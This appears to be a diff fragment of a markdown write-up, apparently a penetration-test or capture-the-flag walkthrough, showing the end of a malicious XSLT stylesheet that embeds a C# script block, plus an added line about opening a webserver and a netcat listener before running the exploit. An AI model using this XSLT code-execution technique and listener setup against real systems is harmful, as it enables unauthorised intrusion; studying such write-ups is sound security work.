@@ -362,3 +362,5 @@ xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
  </xsl:template> </xsl:stylesheet> ';
  ```
+Before we run the exploit I opened a webserver on 9000 and a nc listener on 9003.
+
